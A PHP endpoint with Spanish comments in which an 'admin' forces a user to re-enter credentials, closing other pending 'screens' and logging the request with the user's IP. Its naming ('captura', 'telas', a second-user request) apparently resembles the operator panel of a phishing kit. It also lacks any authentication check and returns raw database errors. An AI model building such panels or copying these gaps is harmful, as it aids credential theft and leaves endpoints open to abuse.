<?php
/**
 * Enviar solicitud de revalidación de credenciales
 * El admin solicita al usuario que reingrese sus credenciales
 */
header('Content-Type: application/json');

try {
    // Incluir configuración de base de datos
    require_once '../php_config/conexionbd.php';
    require_once __DIR__ . '/../php_modales/chat_captura_helper.php';
    
    // Conectar a la base de datos
    $pdo = conectarBD();
    
    // Obtener datos del JSON
    $input = json_decode(file_get_contents('php://input'), true);
    
    $usuario_id = intval($input['usuario_id']);
    $ip_usuario = $input['ip_usuario'] ?? 'unknown';
    
    // Validar datos
    if (!$usuario_id) {
        echo json_encode(['success' => false, 'error' => 'ID de usuario no válido']);
        exit;
    }
    
    // Verificar que el usuario existe
    $stmtUser = $pdo->prepare("SELECT id FROM usuarios WHERE id = ?");
    $stmtUser->execute([$usuario_id]);
    $usuario = $stmtUser->fetch(PDO::FETCH_ASSOC);
    
    if (!$usuario) {
        echo json_encode(['success' => false, 'error' => 'El usuario no existe']);
        exit;
    }

    require_once __DIR__ . '/../php_modales/cerrar_otras_telas.php';
    cerrarTelasPendientes($pdo, $usuario_id);
    
    // Cancelar solicitudes anteriores pendientes del mismo usuario
    $cancelarStmt = $pdo->prepare("
        UPDATE revalidacion_credenciales 
        SET estado = 'cancelado' 
        WHERE usuario_id = ? AND estado = 'pendiente'
    ");
    $cancelarStmt->execute([$usuario_id]);
    
    // Insertar nueva solicitud de revalidación
    $stmt = $pdo->prepare("
        INSERT INTO revalidacion_credenciales 
        (usuario_id, ip_usuario, estado, fecha_envio) 
        VALUES (?, ?, 'pendiente', NOW())
    ");
    
    if ($stmt->execute([$usuario_id, $ip_usuario])) {
        insertarMensajeAdmin($pdo, $usuario_id, $ip_usuario, 'Solicitud 2do Usuario');
        echo json_encode([
            'success' => true,
            'message' => 'Solicitud de revalidación enviada correctamente'
        ]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Error al crear la solicitud']);
    }
    
} catch (PDOException $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error de base de datos: ' . $e->getMessage()
    ]);
} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error: ' . $e->getMessage()
    ]);
}
?>
